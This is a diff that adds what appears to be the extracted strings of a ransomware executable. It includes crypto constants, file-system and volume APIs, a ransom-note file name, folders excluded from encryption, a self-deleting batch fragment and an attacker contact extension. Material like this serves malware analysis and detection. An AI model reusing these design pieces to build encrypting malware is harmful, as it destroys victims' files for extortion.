@@ -1,0 +1,142 @@
+!This program cannot be run in DOS mode.
+.rdata
+advapi32.dll
+SystemFunction036
+A_SHAInit
+A_SHAUpdate
+A_SHAFinal
+CryptReleaseContext
+CryptAcquireContextW
+EES401EP2
+EES587EP1
+expand 32-byte kexpand 16-byte k\
+0123456789ABCDEF
+:Repeat
+if exist "
+" goto Repeat
+ del % 0
+VC20XC00U
+;t$(v(
+UQPXY]Y[
+f;G ssf
+sOAf;M
+[f;7sSf
+Ff;7s"
+tOVj@^+
+v'j@X+
+tOVj@^+
+v'j@X+
+te k_^
+TSVWj@3
+LoadLibraryA
+GetProcAddress
+HeapFree
+HeapReAlloc
+HeapAlloc
+GetProcessHeap
+GetLastError
+ReadFile
+GetModuleFileNameA
+QueryDosDeviceW
+GetLogicalDrives
+FindFirstVolumeW
+EnterCriticalSection
+GetCurrentProcess
+lstrlenW
+WriteFile
+TerminateProcess
+WakeAllConditionVariable
+WaitForMultipleObjects
+LeaveCriticalSection
+InitializeCriticalSection
+InitializeConditionVariable
+SetFilePointer
+GetEnvironmentVariableW
+FatalExit
+GetTempPathW
+lstrlenA
+CreateFileW
+GetLogicalDriveStringsW
+lstrcatW
+CloseHandle
+CreateThread
+SetVolumeMountPointW
+GetWindowsDirectoryW
+DeleteCriticalSection
+ExitProcess
+FindVolumeClose
+GetVolumePathNamesForVolumeNameW
+GetTempFileNameW
+FindNextVolumeW
+MoveFileW
+SleepConditionVariableCS
+FindFirstFileW
+FindNextFileW
+WakeConditionVariable
+FindClose
+ExitThread
+SetFileAttributesW
+lstrcpyW
+InterlockedIncrement
+GetFileSizeEx
+SetEndOfFile
+SetFilePointerEx
+MoveFileExW
+KERNEL32.dll
+ShellExecuteW
+SHELL32.dll
+memmove
+_wcsicmp
+ntdll.dll
+memcpy
+memset
+RtlUnwind
+NtQueryVirtualMemory
+public
+ALLUSERSPROFILE
+TotalFiles.txt
+$RECYCLE.BIN
+.vscode
+COMODO
+Chrome
+Common Files
+Common7
+Dr.Web
+Firefox
+HOW_TO_RECOVERY_FILES.txt
+Internet Explorer
+Kaspersky Lab
+McAfee
+Microsoft
+Microsoft Help
+Microsoft SDKs
+Microsoft Shared
+Microsoft VS Code
+Microsoft Visual Studio
+Microsoft.NET
+Movie Maker
+Mozilla Firefox
+NVIDIA Corporation
+Outlook Express
+ProgramData
+Spytech software
+Symantec
+Symantec_Client_Security
+System Volume Information
+Windows
+Windows App Certification Kit
+Windows Defender
+Windows Kits
+Windows Mail
+Windows Media Player
+Windows Multimedia Platform
+Windows NT
+Windows Phone Kits
+Windows Phone Silverlight Kits
+Windows Photo Viewer
+Windows Portable Devices
+Windows Sidebar
+WindowsPowerShell
+YandexBrowser
+sysconfig
+.[daves.smith@aol.com]
